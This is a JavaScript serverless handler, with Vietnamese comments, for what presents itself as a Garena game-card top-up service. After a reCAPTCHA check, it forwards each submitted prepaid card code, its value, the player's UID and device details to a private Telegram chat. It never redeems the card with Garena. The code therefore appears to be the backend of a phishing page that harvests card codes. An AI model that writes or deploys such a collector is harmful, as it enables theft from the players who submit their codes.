export default async function handler(req, res) {
    // Chỉ cho phép phương thức POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Lấy dữ liệu từ body request
    const { uid, menhgia, mathe, game, device, captchaToken } = req.body;

    // Kiểm tra đầy đủ thông tin
    if (!uid || !menhgia || !mathe || !game || !device || !captchaToken) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    // 1. XÁC THỰC CAPTCHA
    const secretKey = process.env.RECAPTCHA_SECRET_KEY;
    if (!secretKey) {
        console.error('RECAPTCHA_SECRET_KEY not set');
        return res.status(500).json({ error: 'Server configuration error: missing captcha secret' });
    }

    try {
        // Gọi Google reCAPTCHA API để xác thực token
        const verificationUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captchaToken}`;
        const captchaRes = await fetch(verificationUrl, { method: 'POST' });
        const captchaData = await captchaRes.json();

        // Ghi log để debug (sẽ hiện trong Vercel logs)
        console.log('Captcha verification result:', captchaData);

        // Kiểm tra kết quả
        if (!captchaData.success) {
            // Trả về mã lỗi chi tiết từ Google
            return res.status(400).json({ 
                error: 'Captcha verification failed', 
                details: captchaData['error-codes'] || 'Unknown error' 
            });
        }

        // Nếu captcha thành công, tiếp tục xử lý
    } catch (error) {
        console.error('Captcha verification error:', error);
        return res.status(500).json({ error: 'Captcha verification service error' });
    }

    // 2. GỬI TIN NHẮN TELEGRAM
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        console.error('Telegram credentials not set');
        return res.status(500).json({ error: 'Server configuration error: missing telegram credentials' });
    }

    // Tạo nội dung tin nhắn (Markdown)
    const message = `
🎮 **Giao dịch nạp thẻ Garena**

🆔 **UID:** ${uid}
🎯 **Game:** ${game}
💰 **Mệnh giá:** ${menhgia}
🎫 **Mã thẻ:** ${mathe}

📱 **Thiết bị:**
• Loại: ${device.type || 'Không xác định'}
• HĐH: ${device.os || 'Không xác định'}
• Trình duyệt: ${device.browser || 'Không xác định'}
• User Agent: ${device.ua || 'Không xác định'}

⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}
    `;

    try {
        const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await telegramRes.json();
        if (!data.ok) {
            throw new Error(data.description || 'Telegram API error');
        }

        // Trả về thành công
        return res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram send error:', error);
        return res.status(500).json({ error: 'Failed to send Telegram message' });
    }
}